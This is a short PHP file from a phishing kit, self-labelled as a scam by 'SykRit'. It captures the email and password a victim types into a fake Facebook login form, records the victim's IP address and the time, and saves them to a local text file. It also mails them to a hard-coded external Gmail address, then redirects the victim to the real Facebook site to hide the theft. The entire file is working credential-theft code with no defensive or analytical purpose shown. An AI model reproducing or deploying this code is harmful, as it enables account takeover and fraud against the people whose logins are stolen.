<?php

/**   Scam Made By SykRit 2016=====201?  **/
/**   Scam Made By SykRit 2016=====201?  **/
/**   Scam Made By SykRit 2016=====201?  **/
/**   Scam Made By SykRit 2016=====201?  **/
/**   Scam Made By SykRit 2016=====201?  **/

$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$message .= "xxxxxxxxxxxxxxxx+ SykRit +xxxxxxxxxxxxxxxx\n";
$message .= "user: ".$_POST['email']."\n";
$message .= "pass: ".$_POST['pass']."\n";
$message .= "----------\n";
$message .= "IP: ".$ip."\n";
$message .= "Log : $time / $date \n";
$rnessage = "$message\n";
$send= "hasonefff2690@gmail.com";
$subject = "FaceBook SpAm ReZulT | $ip";
$headers = "From: FaceBook SpAm ReZulT";
$file = fopen("SykRit_RzLt.txt","ab");
fwrite($file,$message);
fclose($file);

$str=array($send, $IWP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false)
{
mail($Send,$subject,$rnessage,$headers);
}
header("Location: https://www.facebook.com/");

/***   Scam Made By SykRit 2016=====201?  **/
/***   Scam Made By SykRit 2016=====201?  **/
/***   Scam Made By SykRit 2016=====201?  **/
/***   Scam Made By SykRit 2016=====201?  **/
/***   Scam Made By SykRit 2016=====201?  **/

?>